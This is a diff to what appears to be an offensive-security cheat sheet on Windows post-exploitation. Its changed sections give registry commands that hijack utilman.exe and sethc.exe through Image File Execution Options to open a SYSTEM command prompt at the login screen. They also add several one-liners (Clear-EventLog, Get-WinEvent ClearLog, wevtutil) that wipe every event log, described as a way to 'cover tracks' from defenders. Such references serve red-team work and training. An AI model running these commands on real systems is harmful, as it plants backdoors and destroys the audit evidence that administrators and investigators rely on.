@@ -396,7 +396,7 @@ You can exploit a DLL hijacking vulnerability in the On-Screen Keyboard **osk.ex
 
 #### utilman.exe
 
-After adding this registry key, RDP into the machine. At the login screen, press `Win+U` to get a cmd.exe prompt as NT AUTHORITY\SYSTEM.
+After adding this registry key, RDP or physically log into the machine. At the login screen, press `Win+U` to get a cmd.exe prompt as NT AUTHORITY\SYSTEM.
 
 ```text
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
@@ -404,7 +404,7 @@ REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 
 #### sethc.exe
 
-After adding this registry key, RDP into the machine. At the login screen, repeatedly press F5 when you are at the RDP login screen to get a cmd.exe prompt as NT AUTHORITY\SYSTEM.
+After adding this registry key, RDP or physically log into the machine. At the login screen, repeatedly press F5 when you are at the login screen to get a cmd.exe prompt as NT AUTHORITY\SYSTEM.
 
 ```text
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
@@ -453,6 +453,8 @@ pause >nul
 Exit
 ```
 
+`Unblock-File -Path "<C:\Path\to\blocked\file>"`
+
 #### Legacy Windows Log format
 
 The `Clear-EventLog` cmdlet deletes all of the entries from the specified event logs on the local computer or on remote computers. To use `Clear-EventLog`, you must be a member of the Administrators group on the affected computer.
@@ -497,8 +499,22 @@ Warning! information overload! Lists each individual windows event rather than t
 {% tab title="PowerShell" %}
 Lists all of the non-empty logfiles, then clears each one.
 
+#### Legacy command \(may not be completely accurate in Windows Vista+\)
+
+```text
+Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
+```
+
+#### Windows Vista+ Logs
+
 ```text
 Get-WinEvent -ListLog * | where {$_.RecordCount} | ForEach-Object -Process { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) }
+```
+
+#### Windows built-in command \(not pure PowerShell\)
+
+```text
+wevtutil el | Foreach-Object {wevtutil cl "$_"}
 ```
 {% endtab %}
 
@@ -511,7 +527,7 @@ for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
 {% endtab %}
 {% endtabs %}
 
-can disable logging prior to doing things that would alert defenders, or can clear logs afterwards to cover tracks...TODO add more details
+ can disable logging prior to doing things that would alert defenders, or can clear logs afterwards to cover tracks...TODO add more details
 
 ## References
 
